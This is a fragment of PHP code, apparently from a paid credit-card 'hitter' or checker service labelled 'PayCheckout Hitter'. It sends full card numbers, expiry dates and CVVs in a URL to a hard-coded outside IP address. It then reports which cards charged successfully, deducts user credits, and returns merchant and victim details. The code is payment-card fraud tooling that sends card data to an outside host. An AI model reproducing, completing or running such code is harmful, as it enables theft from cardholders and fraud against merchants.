...
$requestUrl = "http://206.206.78.217:1212/?cc={$cc}|{$month}|{$year}|{$cvv}&paycheckoutUrl=" . urlencode($paycheckoutUrl);
...
$paymentDetails = [
    'site' => $responseData['site'] ?? 'Unknown',
    'price' => $responseData['price'] ?? 'USD 0.00',
    'name' => $responseData['name'] ?? 'Unknown',
    'email' => $responseData['email'] ?? 'unknown@example.com',
    'productName' => $responseData['productName'] ?? 'Unknown',
    'productQuantity' => $responseData['productQuantity'] ?? 0
];
$err = $responseData['response'] ?? 'Unknown Error';

if (stripos($response, '"status":"Success"') !== false) {
    ...
    echo json_encode([
        'status' => 'charge',
        'Response' => $err,
        'Gateway' => 'PayCheckout Hitter',
        'cc' => $cc1,
        'credits' => $newCredits,
        'site' => $paymentDetails['site'],
        'name' => $paymentDetails['name'],
        'email' => $paymentDetails['email'],
        'price' => $paymentDetails['price'],
        'productName' => $paymentDetails['productName'],
        'productQuantity' => $paymentDetails['productQuantity'],
        'brand' => $binInfo['brand'],
    ...
    exit;
} elseif (stripos($response, '"status":"3DS Authentication"') !== false) {
